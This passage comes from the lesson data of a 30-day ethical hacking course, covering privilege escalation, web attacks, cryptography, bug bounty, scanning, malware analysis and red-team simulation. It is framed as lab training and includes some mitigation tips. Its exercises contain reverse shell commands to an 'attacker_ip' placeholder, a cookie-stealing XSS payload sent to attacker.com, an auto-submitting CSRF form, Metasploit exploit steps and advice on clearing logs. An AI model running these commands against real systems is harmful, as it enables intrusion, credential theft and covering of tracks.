             "   - In Metasploit:\n"
             "     ```bash\n"
             "     use exploit/windows/local/ms10_092_schelevator\n"
             "     set SESSION <session_id>\n"
             "     exploit\n"
             "     ```\n"
             "   - After success, you should get `NT AUTHORITY\\SYSTEM` shell\n\n"

             "*💡 Tips:*\n"
             "- Always enumerate thoroughly before trying exploits.\n"
             "- Use Sysinternals tools (`accesschk`, `autoruns`, `procmon`) for manual checks.\n"
             "- Focus on misconfigured services, registry keys, and always install policies.\n"
             "- Disable antivirus temporarily in the lab if payloads are flagged.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Windows Privilege Escalation Guide (by Hackersploit)](https://www.youtube.com/watch?v=opzqPZ-nb9k)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Enumerate privilege escalation vectors in Windows environments\n"
             "- Use PowerShell or binary tools to automate enumeration\n"
             "- Exploit known vulnerabilities for SYSTEM-level access (in test environments)\n"
             "- Understand Windows-specific attack surface and misconfiguration flaws\n",

    "day22": "*📅 Day 22: Linux Hacking*\n\n"
             "Linux is widely used in web servers, cloud infrastructure, and developer environments. As an ethical hacker, you must know how to enumerate, exploit, and escalate privileges on Linux-based systems.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Linux Privilege Escalation Fundamentals:\n"
             "   - Enumerate system information, users, groups, permissions\n"
             "   - Understand environment variables, kernel versions, and binaries\n\n"
             "2. Privilege Escalation Vectors:\n"
             "   - SUID binaries with elevated privileges\n"
             "   - Writable cron jobs or scripts executed as root\n"
             "   - Misconfigured file permissions (e.g., `/etc/passwd`, `/etc/shadow`)\n"
             "   - PATH hijacking in scripts\n"
             "   - Exploiting outdated kernel/local exploits\n\n"
             "3. Tools Overview:\n"
             "   - `linPEAS.sh`: Automated enumeration tool for privilege escalation vectors\n"
             "   - `Linux Exploit Suggester 2`\n"
             "   - `GTFOBins`: Lookup for abusing binaries with SUID/Capabilities\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *All actions must be performed in a controlled lab/VM setup.*\n\n"
             "1. Check for SUID Binaries:\n"
             "   ```bash\n"
             "   find / -perm -4000 2>/dev/null\n"
             "   # Use GTFOBins (https://gtfobins.github.io/) to check for exploitable ones\n"
             "   # Example: If 'vim' has SUID → `vim -c '!sh'`\n"
             "   ```\n\n"

             "2. Exploit Writable Cron Jobs:\n"
             "   - List cron jobs:\n"
             "     ```bash\n"
             "     ls -la /etc/cron* /var/spool/cron/\n"
             "     crontab -l\n"
             "     ```\n"
             "   - If script is writable:\n"
             "     ```bash\n"
             "     echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /path/to/cron/script.sh\n"
             "     nc -lvnp 4444  # Listen for reverse shell\n"
             "     ```\n\n"

             "3. Run `linPEAS.sh` for Enumeration:\n"
             "   ```bash\n"
             "   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n"
             "   chmod +x linpeas.sh\n"
             "   ./linpeas.sh\n"
             "   # Review highlighted lines for potential privesc\n"
             "   ```\n\n"

             "4. BONUS: Exploit PATH Environment Hijacking:\n"
             "   - Vulnerable script:\n"
             "     ```bash\n"
             "     #!/bin/bash\n"
             "     backup\n"
             "     ```\n"
             "   - Create your malicious `backup` binary in PATH:\n"
             "     ```bash\n"
             "     echo -e '#!/bin/bash\\nnc -e /bin/bash attacker_ip 4444' > /tmp/backup\n"
             "     chmod +x /tmp/backup\n"
             "     export PATH=/tmp:$PATH\n"
             "     ./vulnerable_script.sh\n"
             "     ```\n"

             "*💡 Tips:*\n"
             "- Always run `uname -a`, `id`, `sudo -l`, `env`, `ps aux`, `ls -la /home/`, and check for `.bash_history`, `.ssh`, `.config` folders.\n"
             "- Use `script -qc linpeas.sh output.txt` to save output cleanly.\n"
             "- Search for writable files owned by root: `find / -user root -writable 2>/dev/null`\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Linux Privilege Escalation - Practical Guide (by IppSec)](https://www.youtube.com/watch?v=_YhN5dTtQpY)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Enumerate Linux systems thoroughly for misconfigurations\n"
             "- Exploit SUID binaries, writable scripts, and cron jobs for privilege escalation\n"
             "- Use automated tools like `linPEAS` and `GTFOBins` to accelerate the process\n"
             "- Gain elevated shell access ethically in a Linux-based lab environment\n",

    "day23": "*📅 Day 23: Web App Hacking – XSS, CSRF, IDOR*\n\n"
             "Today you’ll go deep into three common yet dangerous vulnerabilities in modern web applications: XSS, CSRF, and IDOR. These flaws impact millions of websites and are frequently seen in bug bounties and real-world breaches.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Cross-Site Scripting (XSS):\n"
             "   - Allows attackers to inject malicious JavaScript into webpages\n"
             "   - Types:\n"
             "     - *Reflected:* Payload in URL, executed immediately\n"
             "     - *Stored:* Payload stored on the server, affects multiple users\n"
             "     - *DOM-based:* Exploits client-side JavaScript\n\n"
             "2. CSRF (Cross-Site Request Forgery):\n"
             "   - Forces authenticated users to perform unwanted actions\n"
             "   - Example: Changing a password via hidden form\n\n"
             "3. IDOR (Insecure Direct Object Reference):\n"
             "   - Occurs when object references (like user ID, invoice ID) are predictable and unprotected\n"
             "   - Leads to unauthorized access to data/resources\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Use DVWA, bWAPP, or PortSwigger Labs (Web Security Academy)* for safe practice.*\n\n"

             "1. Practice XSS:\n"
             "   - In DVWA (low security):\n"
             "     ```html\n"
             "     <script>alert('XSS')</script>\n"
             "     <img src=x onerror=alert('XSS')>\n"
             "     ```\n"
             "   - Use PortSwigger’s XSS labs:\n"
             "     - [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)\n"
             "   - BONUS: Try stealing cookies:\n"
             "     ```html\n"
             "     <script>new Image().src='http://attacker.com/?cookie='+document.cookie</script>\n"
             "     ```\n\n"

             "2. Simulate CSRF Attack:\n"
             "   - Create CSRF HTML page:\n"
             "     ```html\n"
             "     <html>\n"
             "     <body>\n"
             "       <form action='http://victim.com/change_email.php' method='POST'>\n"
             "         <input type='hidden' name='email' value='attacker@evil.com'>\n"
             "         <input type='submit' value='Submit'>\n"
             "       </form>\n"
             "       <script>document.forms[0].submit();</script>\n"
             "     </body>\n"
             "     </html>\n"
             "     ```\n"
             "   - Open this page in a browser where victim is already logged in.\n"
             "   - Observe whether the email is changed automatically.\n\n"

             "3. Exploit IDOR:\n"
             "   - Access a URL like:\n"
             "     ```"
             "     http://target.com/user/1001/profile\n"
             "     ```\n"
             "   - Modify the ID:\n"
             "     ```"
             "     http://target.com/user/1002/profile\n"
             "     ```\n"
             "   - Check if it exposes another user's profile or data.\n"
             "   - Use tools like Burp Suite Repeater to automate and test ID sequences.\n\n"

             "*🔒 Mitigation Tips:*\n"
             "- **XSS:** Use output encoding, Content Security Policy (CSP), input validation\n"
             "- **CSRF:** Implement anti-CSRF tokens, use `SameSite` cookie flag\n"
             "- **IDOR:** Use access control checks and unpredictable object references\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Modern Web App Attacks: XSS, CSRF, IDOR (by LiveOverflow)](https://www.youtube.com/watch?v=HcU2f_1R8tU)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand and exploit XSS in different contexts\n"
             "- Craft and test CSRF attacks in lab environments\n"
             "- Identify and test IDOR vulnerabilities through URL manipulation\n"
             "- Apply basic defenses and understand the security best practices\n",

    "day24": "*📅 Day 24: Cryptography Basics*\n\n"
             "Cryptography is the backbone of secure communication. As a hacker, understanding how encryption and hashing work — and how they can be broken — is critical for analyzing passwords, tokens, secure communications, and data protection flaws.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **Hashing vs Encryption:**\n"
             "   - *Hashing:* One-way function, used for data integrity and password storage (e.g., MD5, SHA1)\n"
             "   - *Encryption:* Two-way process (encrypt + decrypt), used for confidentiality (e.g., AES, RSA)\n"
             "   - *Encoding:* Just data transformation (e.g., Base64), not for security\n\n"
             "2. **Common Algorithms:**\n"
             "   - *Hashing:* MD5, SHA1, SHA256 (older ones are breakable)\n"
             "   - *Encryption:* AES (symmetric), RSA (asymmetric), DES (deprecated)\n"
             "   - *Key sizes:* 128/256-bit for AES; 2048+ for RSA\n\n"
             "3. **Weaknesses and Attack Vectors:**\n"
             "   - Rainbow table attacks (precomputed hashes)\n"
             "   - Brute-force/dictionary attacks on password hashes\n"
             "   - Weak key reuse, insecure key storage\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *All tasks should be done in a local lab — never test real user data or production systems.*\n\n"
             "1. **Generate and Crack Hashes with `john` or `hashcat`:**\n"
             "   - Create hash:\n"
             "     ```bash\n"
             "     echo -n 'password123' | md5sum\n"
             "     # Result: 482c811da5d5b4bc6d497ffa98491e38\n"
             "     ```\n"
             "   - Save it to file:\n"
             "     ```bash\n"
             "     echo '482c811da5d5b4bc6d497ffa98491e38' > hash.txt\n"
             "     ```\n"
             "   - Crack using John:\n"
             "     ```bash\n"
             "     john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n"
             "     ```\n\n"

             "2. **Encrypt and Decrypt with AES (Python):**\n"
             "   ```python\n"
             "   from Crypto.Cipher import AES\n"
             "   from Crypto.Random import get_random_bytes\n"
             "   from base64 import b64encode, b64decode\n\n"
             "   key = get_random_bytes(16)  # AES-128\n"
             "   cipher = AES.new(key, AES.MODE_EAX)\n"
             "   ciphertext, tag = cipher.encrypt_and_digest(b'Attack at dawn')\n\n"
             "   print(\"Ciphertext:\", b64encode(ciphertext))\n"
             "   ```\n"
             "   - Learn to decrypt using the same key and `cipher.decrypt()`\n\n"

             "3. **Try Cracking a Leaked Hash Dump (Example):**\n"
             "   - Use known MD5/SHA1 hash dumps from CTFs (NEVER real leaks)\n"
             "   - Use `hash-identifier` to recognize format\n"
             "   - Crack with `john` or `hashcat`\n\n"

             "*🔒 Mitigation Tips:*\n"
             "- Always store passwords using **strong salted hashes** (bcrypt, scrypt, Argon2)\n"
             "- Never use hardcoded keys in source code\n"
             "- For encryption, use vetted libraries (like Python’s `cryptography` or OpenSSL)\n"
             "- Protect encryption keys as you would protect passwords\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Cryptography Crash Course for Hackers (by Gynvael)](https://www.youtube.com/watch?v=l5Qm1IpE7HE)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand the differences between hashing, encryption, and encoding\n"
             "- Use tools like `john` and `hashcat` to crack hashes in ethical tests\n"
             "- Write AES encryption/decryption scripts in Python\n"
             "- Identify weak cryptographic practices and learn how to secure them\n",

    "day25": "*📅 Day 25: Bug Bounty 101*\n\n"
             "Bug bounty programs allow ethical hackers to legally find and report vulnerabilities in live applications for rewards. It’s one of the best ways to apply your hacking skills professionally and even earn income or career opportunities.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **What is a Bug Bounty?**\n"
             "   - A crowdsourced security testing model\n"
             "   - Security researchers (you) find vulnerabilities, report them, and get rewarded\n"
             "   - Rewards range from swags and Hall of Fame listings to $$$\n\n"
             "2. **Popular Platforms:**\n"
             "   - [HackerOne](https://hackerone.com)\n"
             "   - [Bugcrowd](https://bugcrowd.com)\n"
             "   - [Synack Red Team](https://www.synack.com/red-team/)\n"
             "   - [Intigriti](https://intigriti.com)\n"
             "   - [YesWeHack](https://www.yeswehack.com/)\n\n"
             "3. **Disclosure and Reporting Process:**\n"
             "   - Read the program scope & rules carefully\n"
             "   - Use only authorized methods within scope\n"
             "   - Submit reports with PoC (Proof of Concept), impact, and reproducibility\n"
             "   - Stay professional and respectful — programs reward quality reports\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. **Sign up and explore platforms:**\n"
             "   - Create a researcher account on [HackerOne](https://hackerone.com) or [Bugcrowd](https://bugcrowd.com)\n"
             "   - Complete beginner learning modules on HackerOne’s ‘Hacktivity’ or Bugcrowd University\n\n"
             "2. **Read 5 Disclosed Reports:**\n"
             "   - Go to [HackerOne Hacktivity](https://hackerone.com/hacktivity)\n"
             "   - Read reports on XSS, IDOR, CSRF, auth bypass, etc.\n"
             "   - Understand how they describe the bug, add PoC, and rate the impact\n\n"
             "3. **Try Recon on Public Program:**\n"
             "   - Choose a public program in scope (e.g., `.example.com`, `api.example.com`)\n"
             "   - Basic recon steps:\n"
             "     ```bash\n"
             "     subfinder -d example.com -o subs.txt\n"
             "     assetfinder --subs-only example.com >> subs.txt\n"
             "     httpx -l subs.txt -status -title -tech-detect -o live.txt\n"
             "     ```\n"
             "   - Identify interesting endpoints, logins, APIs, or outdated apps\n"
             "   - Try basic tests like `robots.txt`, `/.git/`, `/.env`, `admin` access\n\n"

             "*🔍 Tools to Explore:*\n"
             "- `Amass`, `subfinder`, `assetfinder` – Subdomain enumeration\n"
             "- `httpx`, `nuclei`, `waybackurls` – Passive recon\n"
             "- `Burp Suite`, `ffuf`, `ParamSpider` – Parameter and directory fuzzing\n"
             "- `JSFinder`, `LinkFinder`, `XNLink` – JavaScript recon\n\n"

             "*📄 Sample Report Structure:*\n"
             "```markdown\n"
             "**Title:** Reflected XSS in feedback form\n\n"
             "**URL:** https://example.com/feedback?name=<script>alert(1)</script>\n\n"
             "**Impact:** Allows attacker to run arbitrary scripts in user’s browser\n\n"
             "**PoC:**\n"
             "1. Go to the feedback form\n"
             "2. Submit this payload: `<script>alert('XSS')</script>`\n"
             "3. Alert box triggers → Reflected XSS confirmed\n\n"
             "**Suggested Fix:** Output encoding and input validation\n\n"
             "**Severity:** Medium\n"
             "```\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 Bug Bounty for Beginners – Full Guide (by NahamSec)](https://www.youtube.com/watch?v=yRkH1R7D8d0)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will:\n"
             "- Understand how bug bounty platforms work\n"
             "- Know how to choose a program and stay within scope\n"
             "- Analyze real reports and write your own with good structure\n"
             "- Perform basic recon on public domains to find testable attack surface\n",

    "day26": "*📅 Day 26: Vulnerability Scanning & Reporting*\n\n"
             "Scanning for vulnerabilities is crucial in identifying weaknesses across networks, servers, and web applications. But scanning is only half the job — professional reporting with clear impact, severity, and mitigation is what makes your findings valuable.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **Top Vulnerability Scanners:**\n"
             "   - *Nessus:* Enterprise-grade vulnerability scanner\n"
             "   - *OpenVAS:* Open-source alternative to Nessus\n"
             "   - *Nikto:* Lightweight web vulnerability scanner\n"
             "   - *Nmap with NSE scripts:* Network and vulnerability detection\n\n"
             "2. **Understanding Scan Outputs:**\n"
             "   - CVE identifiers and severity scores (CVSS)\n"
             "   - Common false positives\n"
             "   - Interpretation of plugin/output details\n\n"
             "3. **Vulnerability Report Writing:**\n"
             "   - Clear title, description, impact, steps to reproduce\n"
             "   - Visual proof (screenshots, logs, PoC)\n"
             "   - Recommended fixes and references\n"
             "   - Use CVSS or OWASP risk rating to define severity\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. **Scan Web Apps and Hosts:**\n"
             "   - Nikto:\n"
             "     ```bash\n"
             "     nikto -h http://target.com\n"
             "     ```\n"
             "   - Nmap with vuln scripts:\n"
             "     ```bash\n"
             "     nmap -sV --script vuln target_ip\n"
             "     ```\n"
             "   - OpenVAS:\n"
             "     - Start with `gvm-setup` and access the web GUI (usually https://localhost:9392)\n"
             "     - Add a target and run a full scan\n"
             "     - Review reports in the dashboard\n\n"
             "2. **Create a Professional PDF Report:**\n"
             "   - Use markdown or templates to write your findings:\n"
             "     ```markdown\n"
             "     # 🔍 Vulnerability Report\n\n"
             "     **Vulnerability Name:** Outdated Apache Version\n\n"
             "     **Target:** http://target.com\n\n"
             "     **Tool Used:** Nikto\n\n"
             "     **Details:** Apache/2.2.15 detected — known CVEs affecting this version.\n\n"
             "     **Impact:** Remote code execution possible via CVE-2017-5638.\n\n"
             "     **Proof:**\n"
             "     - Screenshot of Nikto output\n"
             "     - Relevant CVE link\n\n"
             "     **Severity:** High (CVSS 8.1)\n\n"
             "     **Recommendation:** Upgrade Apache to version ≥ 2.4.46\n"
             "     ```\n"
             "   - Convert to PDF using `pandoc`, `LibreOffice`, or any Markdown to PDF converter\n"
             "     ```bash\n"
             "     pandoc report.md -o vulnerability_report.pdf\n"
             "     ```\n\n"

             "*🧰 Bonus Tools:*\n"
             "- `wpscan` – For scanning WordPress vulnerabilities\n"
             "- `whatweb` or `builtwith` – Web fingerprinting before scanning\n"
             "- `xsser` or `sqlmap` – For deeper injection analysis after basic scans\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 How to Perform Vulnerability Scanning & Write a Report (by NetworkChuck)](https://www.youtube.com/watch?v=_7LRbs1vhI8)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will:\n"
             "- Be able to scan systems for vulnerabilities using open-source and enterprise tools\n"
             "- Understand scan results, distinguish false positives, and prioritize findings\n"
            "- Write structured, actionable, and professional vulnerability reports\n"
            "- Export your findings to PDF and share them securely or submit in bug bounty programs\n",

    "day27": "*📅 Day 27: Malware Analysis Basics*\n\n"
             "Malware analysis helps uncover how malicious software behaves and what harm it can do. It is crucial in incident response, digital forensics, and threat hunting. Today, you'll learn how to safely analyze malware samples in isolated environments.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **Static vs Dynamic Analysis:**\n"
             "   - *Static Analysis:* Examining the malware file without executing it\n"
             "     - Tools: `strings`, `file`, `binwalk`, `exiftool`\n"
             "     - Reveals hardcoded IPs, URLs, commands, metadata\n"
             "   - *Dynamic Analysis:* Running malware in a controlled environment to observe behavior\n"
             "     - Tools: `Cuckoo Sandbox`, `Any.Run`, `Remnux`, Process Monitor\n"
             "     - Monitors file changes, network activity, persistence, and payloads\n\n"
             "2. **Indicators of Compromise (IOCs):**\n"
             "   - Domains, IP addresses, file hashes (MD5/SHA256), mutexes, registry keys\n"
             "   - Useful in detection, blocking, and threat intel feeds\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Always work in an isolated VM (e.g., VirtualBox or VMware) with no internet access.*\n\n"
             "1. **Static Analysis:**\n"
             "   - Identify file type:\n"
             "     ```bash\n"
             "     file sample.exe\n"
             "     ```\n"
             "   - Extract printable strings:\n"
             "     ```bash\n"
             "     strings sample.exe | less\n"
             "     ```\n"
             "   - Check for embedded files/configs:\n"
             "     ```bash\n"
             "     binwalk -e sample.exe\n"
             "     ```\n"
             "   - View metadata:\n"
             "     ```bash\n"
             "     exiftool sample.exe\n"
             "     ```\n\n"

             "2. **Dynamic Analysis (Cuckoo Sandbox):**\n"
             "   - Install Cuckoo: [https://cuckoosandbox.org/](https://cuckoosandbox.org/)\n"
             "   - Run Cuckoo Host + VM Agent (Windows 7 VM recommended)\n"
             "   - Submit a sample:\n"
             "     ```bash\n"
             "     cuckoo submit sample.exe\n"
             "     ```\n"
             "   - View behavior reports in Cuckoo web interface\n"
             "   - Note: Watch for processes spawned, API calls, dropped files, registry changes\n\n"

             "3. **Extract IOCs from Report:**\n"
             "   - SHA256 hashes, contacted domains/IPs\n"
             "   - File writes (e.g., `temp\\evil.dll`)\n"
             "   - Registry edits (e.g., Run keys for persistence)\n\n"

             "*📁 IOC Report Example:*\n"
             "```markdown\n"
             "**Sample:** sample.exe\n"
             "**Hash (SHA256):** 1f4a7cbd19cf... (truncated)\n"
             "**Behavior:**\n"
             "- Creates `C:\\Temp\\loader.dll`\n"
             "- Connects to `malicious-domain.xyz`\n"
             "- Adds Run key for persistence: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n"
             "**Risk Level:** High\n"
             "**Recommended Action:** Block hash, domain, and reimage affected systems\n"
             "```\n\n"

             "*🧰 Optional Tools:*\n"
             "- `PEStudio` (Windows): Static inspection of PE files\n"
             "- `Procmon` and `Wireshark` during dynamic analysis\n"
            "- `IDA Free `, `Ghidra`: Reverse engineering(advanced)\n\n"
            
            "*📺 Suggested YouTube Video:*\n"
            "[🎥 Malware Analysis for Beginners (by John Hammond)](https://www.youtube.com/watch?v=u8Nn-Ah4WiY)\n\n"
            
            "*✅ Outcome:*\n"
            "By the end of today, you will:\n"
            "- Understand the difference between static and dynamic malware analysis\n"
            "- Analyze malware behavior using safe tools and virtual environments\n"
            "- Extract valuable indicators of compromise (IOCs) for further use in detection\n",

    "day28": "*📅 Day 28: Red Team vs Blue Team*\n\n"
             "Cybersecurity is a game of cat and mouse. Red Teams simulate attackers to uncover weaknesses, while Blue Teams defend and detect these actions. Understanding both sides sharpens your hacking and defense capabilities.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **Red Team TTPs (Tactics, Techniques, and Procedures):**\n"
             "   - Initial Access: Phishing, exploit, misconfig\n"
             "   - Execution: Payloads (reverse shells, PowerShell, DLL injection)\n"
             "   - Persistence: Registry Run keys, startup folders\n"
             "   - Privilege Escalation: Exploiting weak permissions, token manipulation\n"
             "   - Lateral Movement: SMB, PsExec, RDP\n"
             "   - Exfiltration: Data theft and C2 (Command & Control)\n\n"
             "2. **Blue Team Techniques:**\n"
             "   - Log analysis: Monitor system logs, security events\n"
             "   - SIEM tools: Splunk, ELK Stack for log correlation and alerts\n"
             "   - Host-based detection: Windows Event Viewer, Sysmon, Wazuh\n"
             "   - Network monitoring: IDS/IPS (Snort, Suricata), Wireshark\n"
             "   - Response: Quarantine host, block IOC, patch systems\n\n"
             "3. **Detection and Logging:**\n"
             "   - Know what to log: Logon attempts, PowerShell use, new processes, registry changes\n"
             "   - Detecting C2 and beaconing behavior\n"
             "   - MITRE ATT&CK Framework to understand attacker behavior patterns\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ Use isolated lab VMs (Kali + Windows VM) only.\n\n"
             "1. **Simulate Attacks (Red Team):**\n"
             "   - Launch a reverse shell using Metasploit:\n"
             "     ```bash\n"
             "     msfconsole\n"
             "     use exploit/windows/smb/ms08_067_netapi\n"
             "     set payload windows/meterpreter/reverse_tcp\n"
             "     set LHOST <your_ip>\n"
             "     run\n"
             "     ```\n"
             "   - Try privilege escalation inside the session\n\n"
             "2. **Monitor and Detect (Blue Team):**\n"
             "   - Install and use Splunk or ELK (ElasticSearch + Logstash + Kibana)\n"
             "   - Collect logs from target VM\n"
             "   - Query in Splunk to detect suspicious PowerShell, failed logons:\n"
             "     ```splunk\n"
             "     index=windows sourcetype=WinEventLog:Security EventCode=4625\n"
             "     ```\n"
             "   - Use Sysmon to log detailed process activity\n\n"

             "*🧰 Tools to Explore:*\n"
             "- Red Team: `Metasploit`, `PowerShell Empire`, `Nishang`, `CrackMapExec`\n"
             "- Blue Team: `Splunk`, `Elastic Stack`, `Wazuh`, `Sysmon`, `OSSEC`\n"
             "- MITRE ATT&CK Navigator: https://attack.mitre.org/\n\n"

             "*📄 Sample Report Insight (Blue Team):*\n"
             "```markdown\n"
             "**Incident Detected:** PowerShell-based reverse shell\n\n"
             "**TTPs Mapped (MITRE):**\n"
             "- T1059: Command and Scripting Interpreter\n"
             "- T1071: Application Layer Protocol (TCP outbound to C2)\n\n"
             "**Detection Method:** Splunk search for suspicious PowerShell:\n"
             "`powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient)...\"`\n\n"
             "**Action Taken:**\n"
             "- Host isolated\n"
             "- Reverse shell IP blocked\n"
            "- User password reset\n"
            "```\n\n"
            
            "*📺 Suggested YouTube Video:*\n"
            "[🎥 Red Team vs Blue Team Simulation (by John Hammond)](https://www.youtube.com/watch?v=fT7-rwKxJrM)\n\n"
            
            "*✅ Outcome:*\n"
            "By the end of today, you will:\n"
            "- Understand the differences between offensive (Red) and defensive (Blue) operations\n"
            "- Be able to simulate basic attacks and detect them using a SIEM\n"
            "- Learn to think like an attacker and act like a defender\n"
            "- Get familiar with industry frameworks like MITRE ATT&CK",

    "day29": "*📅 Day 29: Full Hack Simulation*\n\n"
             "It's time to bring everything together in a complete penetration testing simulation. This exercise will test your ability to plan, execute, and document a full attack chain — just like a real-world Red Teamer or ethical hacker would.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **End-to-End Attack Chain:**\n"
             "   - Information Gathering (Passive & Active Recon)\n"
             "   - Vulnerability Analysis\n"
             "   - Exploitation (RCE, LFI, SQLi, etc.)\n"
             "   - Privilege Escalation (Windows/Linux)\n"
             "   - Persistence and Cleanup\n"
             "   - Data Exfiltration Techniques\n\n"
             "2. **Attack Planning & Execution:**\n"
             "   - Scoping and Rule of Engagement (RoE)\n"
             "   - Tool selection strategy\n"
             "   - Documenting each step for reporting\n\n"

             "*🛠️ Practical Tasks:*\n"
             "⚠️ *Use only authorized vulnerable machines (TryHackMe, HackTheBox, VulnHub)*\n\n"
             "1. **Choose a Target Machine:**\n"
             "   - Recommended Labs:\n"
             "     - TryHackMe: *Mr. Robot*, *SimpleCTF*, *Overpass*\n"
             "     - VulnHub: *Basic Pentesting 1*, *DC Series*, *Kioptrix*\n\n"
             "2. **Perform Full Attack Chain:**\n"
             "   - Recon:\n"
             "     ```bash\n"
             "     nmap -sC -sV -T4 target_ip\n"
             "     gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt\n"
             "     ```\n"
             "   - Exploitation:\n"
             "     - Look for version-based CVEs or try manual SQLi, LFI, file uploads\n"
             "   - Privilege Escalation:\n"
             "     - Use `linPEAS`, `winPEAS`, check for SUID, writable cron, PATH hijacking\n"
             "   - Post-Exploitation:\n"
             "     - Steal credentials, extract tokens, gather flags\n"
             "   - Exfiltration:\n"
             "     - Use Netcat, FTP, or encoded data transfer\n"
             "   - Cleanup:\n"
             "     - Remove logs, created users, reverse shell artifacts\n\n"

             "*📄 Sample Report Outline:*\n"
             "```markdown\n"
             "# 📑 Penetration Test Report – THM: Mr. Robot\n\n"
             "## Summary:\n"
             "- Target: 10.10.189.140\n"
             "- Final Flags Captured: user.txt, root.txt\n\n"
             "## Steps:\n"
             "1. **Recon:** Nmap revealed ports 22 (SSH), 80 (Apache), 443 (SSL)\n"
             "2. **Enum:** Found WordPress login with `wpscan`, brute-forced credentials\n"
             "3. **Exploit:** Uploaded reverse shell via vulnerable theme editor\n"
             "4. **Privesc:** Found `nmap` with interactive mode → root shell\n"
             "5. **Exfil:** Retrieved `/etc/shadow`, `/var/www/html/flag.txt`\n"
             "6. **Cleanup:** Cleared `.bash_history`, removed shell\n\n"
             "## Recommendation:\n"
             "- Disable theme editing, patch outdated software, apply least privilege policies\n"
             "```\n\n"

             "*📺 Suggested Walkthrough Videos:*\n"
             "- [🎥 TryHackMe – Mr. Robot (by Hackersploit)](https://www.youtube.com/watch?v=G-yz1j6ct9M)\n"
             "- [🎥 VulnHub Kioptrix 1 Walkthrough](https://www.youtube.com/watch?v=UjU4fF-w2nU)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will:\n"
             "- Execute a complete hacking lifecycle: recon → exploit → escalate → report\n"
             "- Strengthen your penetration testing methodology\n"
             "- Understand the workflow needed for real-world bug bounty or CTF challenges\n"
             "- Gain confidence in full-chain exploitation and documentation",

    "day30": "*📅 Day 30: 🎓 Graduation & Next Steps*\n\n"
             "Congratulations! You’ve completed a full 30-day journey into ethical hacking. But this is just the beginning. Now it's time to focus on real-world application, certifications, personal projects, and career growth.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. **Top Cybersecurity Certifications:**\n"
             "   - 🛡️ *OSCP (Offensive Security Certified Professional):* Practical, hands-on, industry-valued cert for Pentesters\n"
             "   - 🕵️ *PNPT (Practical Network Penetration Tester):* Created by TCM Security, very practical and affordable\n"
             "   - 🔐 *CEH (Certified Ethical Hacker):* Recognized globally, covers theoretical + practical knowledge\n"
             "   - 🧑‍💻 *Security+ / eJPT / CompTIA:* Great for entry-level roles and getting started in cybersecurity\n\n"
             "2. **Cybersecurity Career Paths:**\n"
             "   - 🥷 *Red Team:* Ethical hacker, pentester, exploit developer\n"
             "   - 🛡️ *Blue Team:* SOC analyst, IR specialist, SIEM engineer\n"
             "   - 🤖 *Purple Team:* Bridging attacker and defender mindsets\n"
             "   - 📊 *Threat Intelligence, Malware Analyst, AppSec, DevSecOps, etc.*\n\n"
             "3. **Building Your Brand & Portfolio:**\n"
             "   - Personal blog or GitHub with CTF writeups, scripts, notes\n"
             "   - LinkedIn profile tailored to security\n"
             "   - TryHackMe, HackTheBox, or CTFtime scores\n"
             "   - Public bug bounty disclosures (HackerOne, Bugcrowd)\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. **Setup GitHub Portfolio:**\n"
             "   - Create a `README.md` with your journey, tools used, labs completed, flags captured\n"
             "   - Example:\n"
             "     ```markdown\n"
             "     ## 🧠 My Cybersecurity Journey\n"
             "     - 🔍 Reconnaissance with Nmap, theHarvester\n"
             "     - ⚔️ Exploits with Metasploit & custom payloads\n"
             "     - 🎯 Labs Completed: THM – Mr. Robot, VulnHub – DC Series\n"
             "     - 🏆 Certifications in Progress: PNPT\n"
             "     ```\n\n"

             "2. **Contribute to Security Projects:**\n"
             "   - Fork and improve open-source tools (e.g., Nmap scripts, Wordlists, Python scanners)\n"
             "   - Submit pull requests, bug reports, or documentation updates\n\n"

             "3. **Apply for Internships or Research Roles:**\n"
             "   - Check Internshala, LinkedIn, HackerOne Hacktivity, and OWASP Chapters\n"
             "   - Email companies with your GitHub/portfolio\n"
             "   - Join security communities: Discords, Telegram, Reddit, OWASP, Bugcrowd Forums\n\n"

             "*📁 Bonus Tips:*\n"
             "- Start a Medium blog and write CTF walkthroughs\n"
             "- Post regularly on LinkedIn with your learning milestones\n"
             "- Keep practicing and join competitions (CTFs, hackathons)\n"
             "- Use `TryHackMe Paths`: Complete *Pre-Security*, *Jr. Penetration Tester*, *SOC Level 1*\n\n"

